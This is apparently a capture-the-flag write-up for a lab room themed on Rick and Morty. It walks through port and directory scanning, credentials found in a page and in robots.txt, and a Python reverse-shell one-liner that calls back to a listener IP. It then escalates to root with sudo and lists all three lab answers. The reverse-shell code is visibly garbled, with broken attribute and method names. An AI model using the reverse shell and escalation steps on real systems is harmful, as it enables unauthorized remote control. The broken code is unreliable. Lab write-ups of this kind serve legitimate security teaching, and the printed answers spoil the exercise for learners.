## 🌌 Rick and Morty Adventure
![RickAndMorty](rickandmorty.jpeg)

### Task 1: Pickle Rick! 🥒

Join Rick in this thrilling challenge where you'll navigate a web server to find three secret ingredients. These are essential for Rick to concoct his potion and revert back from his pickle form.


---

### 🕵️‍♂️ Exploration Phase

1. **Initial Clues**: A peek into the web server reveals a note hinting at a username.
   - **Username**: `R1ckRul3s`

2. **Nmap Scan**: Discovering what's open.
   ```bash
   nmap 10.10.239.182
   ```
   - Results show **SSH (22)** and **HTTP (80)** ports welcoming us.

3. **Directory Hunting**: Time to uncover hidden paths.
   ```bash
   gobuster dir -u 10.10.239.182 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,html,txt,css
   ```
   - Interesting finds: `/login.php`, `/robots.txt` (containing the password clue `Wubbalubbadubdub`).

---

### 📜 Gathering Ingredients

1. **First Ingredient**: Found in `Sup3rS3cretPickl3Ingred.txt`.
   - **Ingredient**: Mr. Meeseek hair.

   #### 🔧 Automating the Process   
   ```python
   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket   SOCK_STREAM);s.connect(("10.10.77.245",9999));os.dup2(s.fileno(),0); os.dup2(s.filen   (),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   ```   
   This command establishes a reverse shell connection back to your machine. Don't   forget to replace `"10.10.77.245"` with your listener's IP address and `9999` with   the port number you're listening on.

2. **Second Ingredient**: A journey through the file system unveils:
   ```bash
   sudo -l
   sudo -u root /bin/bash
   cd rick
   cat "second ingredients"
   ```
   - **Ingredient**: 1 Jerry tear.

3. **Final Ingredient**: The last leap into `/root`.
   ```bash
   cat 3rd.txt
   ```
   - **Ingredient**: Fleeb juice.

---